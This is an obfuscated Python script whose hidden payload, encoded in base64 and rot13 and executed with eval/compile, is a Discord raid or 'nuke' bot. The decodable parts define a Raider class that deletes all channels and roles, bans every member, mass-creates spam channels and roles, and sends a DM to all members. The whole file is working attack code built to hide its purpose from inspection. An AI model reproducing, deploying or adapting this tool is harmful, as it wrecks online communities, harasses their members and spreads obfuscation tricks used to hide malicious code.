import base64 ,codecs #line:4
magic ='ZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSAsU3R5bGUgI2xpbmU6MQ0KaW1wb3J0IGRpc2NvcmQgI2xpbmU6Mg0KZGVmIHNldF9jb25maWcgKE9PMDBPT08wT08wT09PME8wICk6I2xpbmU6NA0KICBnbG9iYWwgY29uZmlnICNsaW5lOjUNCiAgY29uZmlnID1PTzAwT09PME9PME9PTzBPMCAjbGluZTo2DQpjbGFzcyBSYWlkZXIgKCk6I2xpbmU6Nw0KICBhc3luYyBkZWYgRGVsZXRlQ2hhbm5lbHMgKE8wT08wMDBPMDAwME9PT08wICk6I2xpbmU6OA0KICAgIGZvciBPT08wT09PT09PT09PTzBPMCBpbiBPME9PMDAwTzAwMDBPT09PMCAuY2hhbm5lbHMgOiNsaW5lOjkNCiAgICAgIHRyeSA6I2xpbmU6MTANCiAgICAgICAgYXdhaXQgT09PME9PT09PT09PT08wTzAgLmRlbGV0ZSAoKSNsaW5lOjExDQogICAgICAgIHByaW50IChmIntPT08wT09PT09PT09PTzBPMC5uYW1lfSB3YXMgZGVsZXRlZC4iKSNsaW5lOjEyDQogICAgICBleGNlcHQgOiNsaW5lOjEzDQogICAgICAgIHByaW50IChmIntPT08wT09PT09PT09PTzBPMC5uYW1lfSB3YXMgTk9UIGRlbGV0ZWQuIikjbGluZToxNA0KICBhc3luYyBkZWYgQmFuTWVtYmVycyAoT08wMDBPTzBPTzBPME8wT08gKTojbGluZToxNQ0KICAgICAgZm9yIE8wTzAwTzAwT08wT09PME9PIGluIE9PMDAwT08wT08wTzBPME9PIC5tZW1iZXJzIDojbGluZToxNg0KICAgICAgICB0cnkgOiNsaW5lOjE3DQogICAgICAgICAgYXdhaXQgTzBPMDBPMDBPTzBPT08wT08gLmJhbiAoKSNsaW5lOjE4DQogICAgICAgICAgcHJpbnQgKGYie08wTzAwTzAwT08wT09PME9PLm5hbWV9I3tPME8wME8wME9PME9PTzBPTy5kaXNjcmltaW5hdG9yfSBXYXMgYmFubmVkIikjbGluZToxOQ0KICAgICAgICBleGNlcHQgOiNsaW5lOjIwDQogICAgICAgICAgcHJpbnQgKGYie08wTzAwTzAwT08wT09PME9PLm5hbWV9I3tPME8wME8wME9PME9PTzBPTy5kaXNjcmltaW5hdG9yfSBXYXMgdW5hYmxlIHRvIGJlIGJhbm5lZC4iKSNsaW5lOjIxDQogIGFzeW5jIGRlZiBEZWxldGVSb2xlcyAoTzAwTzBPTzAwMDBPTzBPMDAgKTojbGluZToyMg0KICAgIGZvciBPMDAwMDBPTzBPT08wTzAwTyBpbiBPMDBPME9PMDAwME9PME8wMCAucm9sZXMgOiNsaW5lOjIzDQogICAgIHRyeSA6I2xpbmU6MjQNCiAgICAgICBhd2FpdCBPMDAwMDBPTzBPT08wTzAwTyAuZGVsZXRlICgpI2xpbmU6MjUNCiAgICAgICBwcmludCAoZiJ7TzAwMDAwT08wT09PME8wME8ubmFtZX0gSGFzIGJlZW4gZGVs'#line:5
love ='MKEyMPVcV2kcozH6ZwLAPvNtVPNtMKuwMKO0VQbwoTyhMGblAj0XVPNtVPNtVUOlnJ50VPuzVagCZQNjZQOCGmOCG08jGmNjGl5hLJ1ysFOVLKZtoz90VTWyMJ4tMTIfMKEyMPVcV2kcozH6ZwtAPvNtLKA5ozZtMTIzVRAbLJ5aMH5uoJHtXR9CZR8jZQNjG08jZQNjZR9CVPx6V2kcozH6ZwxAPvNtVPO0paxtBvAfnJ5yBwZjQDbtVPNtVUOlnJ50VPuTo3WyVP5PGSISVPgzVygBDH1SKFOQFRSBE0yBElOGEIWJEIVtGxSAEFOHGlNvX2AiozMcMlOoW05OGHHaKFxwoTyhMGbmZD0XVPNtVPOuq2ScqPOCGmOCZQNjZR9CZQNjZQOCGlNhMJEcqPNbozSgMFN9L29hMzyaVSfaGxSAEFqqYUWyLKAiovN9VyAypaMypvOlLJyxMJDtLaxtDzkuL2gmoTSmnPVcV2kcozH6ZmVAPvNtVPOyrTAypUDtBvAfnJ5yBwZmQDbtVPNtVPOjpzyhqPNbVzMunJkyMPVcV2kcozH6ZmDAPvNtLKA5ozZtMTIzVRAbLJ5aMHywo24tXR8jZR8jZR9CG08jGmOCZR8jVPx6V2kcozH6ZmHAPvNtVPO3nKEbVT9jMJ4tXTAiozMcMlOoW0yQG04aKFjvpzVvXJSmVR8jGmNjZR9CG09CG09CZR8jVQbwoTyhMGbmAt0XVPNtVPNtG09CZQOCZR8jGmOCZQOCZR8tCH8jGmNjZR9CG09CG09CZR8jVP5lMJSxVPtcV2kcozH6ZmpAPvNtVPOjpzyhqPNbEz9lMFNhDxkIEFNeMvWoFHACGy0tD0uOGxqWGvOGEIWJEIVtFHACGvOHGlNvX2AiozMcMlOoW0yQG04aKFxwoTyhMGbmBN0XVPNtVUElrFN6V2kcozH6ZmxAPvNtVPNtVTS3LJy0VR8jZR8jZR9CG08jGmOCZR8jVP5yMTy0VPucL29hVQ1CG08jZR8jGmOCZR8jZR8jGlNcV2kcozH6AQNAPvNtVPNtVUOlnJ50VPuTo3WyVP5UHxISGvNeVyAID0ASH1ZvXFAfnJ5yBwDkQDbtVPNtMKuwMKO0VQbwoTyhMGb0Zt0XVPNtVPNtpUWcoaDtXRMipzHtYyWSEPNeVxMOFHkSEPVcV2kcozH6AQZAPvNtLKA5ozZtMTIzVRAbMJS0MHyhqzy0MKZtXR8jZR8jZR8jGmOCG08jZR8jVPx6V2kcozH6AQDAPvNtVPOzo3VtGmOCG08jGmOCZR9CZR9CGmNtnJ4tGmNjGmNjGmOCZR9CGmNjGmNtYaEyrUEsL2uuoz5yoUZtBvAfnJ5yBwD1QDbtVPNtVPNtVR8jG09CZQOCG08jZQNjZQNjVQ1uq2ScqPOCZR9CGmOCZR8jG08jG09CZPNhL3WyLKEyK2yhqzy0MFNboJS4K2SaMFN9ZPNfoJS4K3ImMKZtCGNtXFAfnJ5yBwD2QDbtVPNtVPNtVUOlnJ50VPuzVx5yqlOWoaMcqTH6VUgCZR9CGmNjG09CZQNjZQNjZU0vXFAfnJ5yBwD3QDbtVTSmrJ5wVTEyMvOQpzIuqTIQnTShozIfplNbG08jZR8jGmNjZR9CG08jGmNt'#line:6
god ='LE9PT08wMDBPME9PME8wTzBPICk6I2xpbmU6NDgNCiAgICBPT09PMDAwTzBPTzBPME8wTyA9MzAwICNsaW5lOjQ5DQogICAgZm9yIE8wT09PME9PTzBPT08wT08wIGluIHJhbmdlIChPT09PMDAwTzBPTzBPME8wTyApOiNsaW5lOjUwDQogICAgICAgYXdhaXQgT08wME8wTzAwME9PT08wTzAgLmNyZWF0ZV90ZXh0X2NoYW5uZWwgKGNvbmZpZyBbJ1NQQU1fQ0hBTk5FTCddKSNsaW5lOjUxDQogICAgcHJpbnQgKGYibnVrZWQge09PMDBPME8wMDBPT09PME8wLm5hbWV9IFN1Y2Nlc3NmdWxseS4iKSNsaW5lOjUyDQogICAgcmV0dXJuICNsaW5lOjUzDQogIGFzeW5jIGRlZiBDcmVhdGVSb2xlcyAoTzAwME9PTzBPMDBPME9PMDAgKTojbGluZTo1NA0KICAgIE8wTzAwTzAwMDBPMDAwME9PID1UcnVlICNsaW5lOjU1DQogICAgcHJpbnQgKCJbUk9MRVNdIENSRUFUSU5HIFJPTEVTLi4uIikjbGluZTo1Ng0KICAgIE9PT09PMDBPME8wME8wMDBPID0wICNsaW5lOjU3DQogICAgd2hpbGUgTzBPMDBPMDAwME8wMDAwT08gPT1UcnVlIDojbGluZTo1OA0KICAgICAgICBPT09PTzAwTzBPMDBPMDAwTyArPTEgI2xpbmU6NTkNCiAgICAgICAgdHJ5IDojbGluZTo2MA0KICAgICAgICAgICAgYXdhaXQgTzAwME9PTzBPMDBPME9PMDAgLmNyZWF0ZV9yb2xlIChuYW1lID1jb25maWcgWydST0xFX05BTUUnXSkjbGluZTo2MQ0KICAgICAgICAgICAgcHJpbnQgKGYiWytdIHJvbGUgYWRkZWQsIHtPT09PTzAwTzBPMDBPMDAwT30gZG9uZSIpI2xpbmU6NjINCiAgICAgICAgZXhjZXB0IDojbGluZTo2Mw0KICAgICAgICAgICAgcHJpbnQgKGYiW35dIE5PIE1PUkUgUk9MRSBTUEFDRSwge09PT09PMDBPME8wME8wMDBPfSBkb25lIikjbGluZTo2NA0KICBhc3luYyBkZWYgRE1BbGwgKE8wME9PT09PTzAwT08wME8wICk6I2xpbmU6NjUNCiAgICBPME9PMDAwTzAwME8wME9PTyA9MCAjbGluZTo2Ng0KICAgIE9PT08wT08wMDAwMDAwME8wID1jb25maWcgWydETV9NRVNTQUdFJ10jbGluZTo2Nw0KICAgIGZvciBPMDBPTzBPTzBPT08wTzBPTyBpbiBPMDBPT09PT08wME9PMDBPMCAubWVtYmVycyA6I2xpbmU6NjgNCiAgICAgICAgdHJ5IDojbGluZTo2OQ0KICAgICAgICAgICAgYXdhaXQgTzAwT08wT08wT09PME8wT08gLnNlbmQgKE9PT08wT08wMDAwMDAwME8wICkjbGluZTo3MA0KICAgICAgICAgICAgcHJpbnQgKGYiWytdIERNIHNlbmRlZCB0byB7TzAwT08wT08wT09PME8wT099IikjbGluZTo3MQ0KICAg'#line:7
destiny ='VPNtVPNtVPNtGmOCGmNjZR8jZQOCZQOCG08tXm0kVPAfnJ5yBwplQDbtVPNtVPNtVTI4L2IjqPN6V2kcozH6AmZAPvNtVPNtVPNtVPNtVUOlnJ50VPuzVyfgKFOQo3IfMPOho3Dtp2IhMTIxVREAVUEiVUgCZQOCGmOCGmOCG08jGmOCG30vXFAfnJ5yBwp0QDbtVPNtVPNtVUOlnJ50VPuzVykhJlgqVRMcozymnTIxVUAyozEcozptMT0fVUA1L2ImMaIfrFOmMJ5xMJDtqT8tr08jG08jZQOCZQNjGmNjG09CsFO1p2IlplVcV2kcozH6AmHAPzAfLKAmVTuyoUOypaZtBvAfnJ5yBwp2QDbtVTEyMvObMJkjK21mMlNbXGbwoTyhMGb3Aj0XVPNtVR9CZR9CGmOCZQOCGmOCG09CVQ0bWlpaQDbaWlpeEz9lMFNhHxIRVPfaWlp9CG09CG09CG09CG09CG09CG09CG09CGj8VRWfLJAep2kup2ttGaIeMKVtCw49CG09CG09CG09CG09CG09CG09CG09CFNaWlpeH3E5oTHtYyWSH0IHK0SZGPNeWlpaQDbtWlpaX2AiozMcMlOoW1OFEHMWJPqqXlpaW251n2HtCFORMKA0pz95plO0nTHtp2IlqzIlVSkhVPpaWlgwo25znJptJlqDHxITFItaKFfaWlqgLKAmMT0tCFORGKZtLJkfVUOyo3OfMFOcovO0nTHtp2IlqzIlQDbtWlpaX0MipzHtYyWSEPNeWlpaCG09CG09CG09CG09CG09CG09CG09CG08CPOPoTSwn3AfLKAbVR51n2HtCw49CG09CG09CG09CG09CG09CG09CG09CFNaWlpeH3E5oTHtYyWSH0IHK0SZGPNeWlpaKT5VMJAbolOjo3VtWlpaX0MipzHtYyySGRkCIlNeWlpaH2uyMKO5D2S0VmLjZGRaWlpeH3E5oTHtYyWSH0IHK0SZGPNcV2kcozH6BQRAPvNtVPOjpzyhqPNbG08jG09CZR8jZR9CZR9CG08tXFAfnJ5yBwtlQDbtVTSmrJ5wVTEyMvObMJkjVPuCZQNjG08jG08jZQOCG09CZPNcBvAfnJ5yBwtmQDbtVPNtVPOCZQOCG08jG09CZQNjZR9CGlN9MTymL29lMPNhEJ1vMJDtXUEcqTkyVQ0vDzkuL2gmoTSmnPOFLJyxMKVtD29goJShMUZvYTEyp2AlnKO0nJ9hVQ0aWlpdXx51n2IlBvbdKT4aWlpeL29hMzyaVSfaHSWSExyLW10eWlpaoaIeMFN9VREyp3Elo3ymVUEbMFOmMKW2MKVtKT4tWlpaX2AiozMcMlOoW1OFEHMWJPqqXlpaW21up3AxoFN9VREAplOuoTjtpTIipTkyVTyhVUEbMFOmMKW2MKVaWlpfL29fo3VtCGO4ZmZ2EHMTVPxwoTyhMGb4At0XVPNtVPNtLKqunKDtGmNjZR9CZR9CZQNjG09CGmNtYzS1qTuipvNhp2IhMPNbMJ1vMJDtCH8jZR9CGmOCG08jZQNjG09CVPxwoTyhMGb4BN0XVPNtVPNtLKqunKDtGmNjZR9CZR9CZQNjG09CGmNtYz1yp3AuM2HtYzEyoTI0MFNbXFAfnJ5yBwt5QDb='#line:8
joy ='\x72\x6f\x74\x31\x33'#line:9
trust =eval ('\x6d\x61\x67\x69\x63')+eval ('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29')+eval ('\x67\x6f\x64')+eval ('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')#line:10
eval (compile (base64 .b64decode (eval ('\x74\x72\x75\x73\x74')),'<string>','exec'))
